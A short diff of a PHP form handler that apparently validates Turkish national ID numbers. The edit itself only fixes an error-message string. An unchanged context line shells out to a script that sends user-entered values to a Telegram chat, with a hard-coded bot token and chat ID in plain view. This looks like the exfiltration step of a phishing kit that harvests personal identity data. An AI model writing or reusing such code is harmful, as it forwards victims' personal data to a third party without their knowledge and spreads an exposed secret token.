@@ -84,7 +84,7 @@ try {
 				shell_exec("bash telegram.sh -t 955394922:AAESgbKgapI6lFDxWkm9J51Fexsgp6fIJCs -c -358454701 KBB:$baslamat:$user");
 
 	 }else {
-			echo 0.", T.C Kimlik Numarasi Dogrulanmadı."; 	
+			echo "0".", T.C Kimlik Numarasi Dogrulanmadı."; 	
 	 }
 
 }catch (Exception $hata){
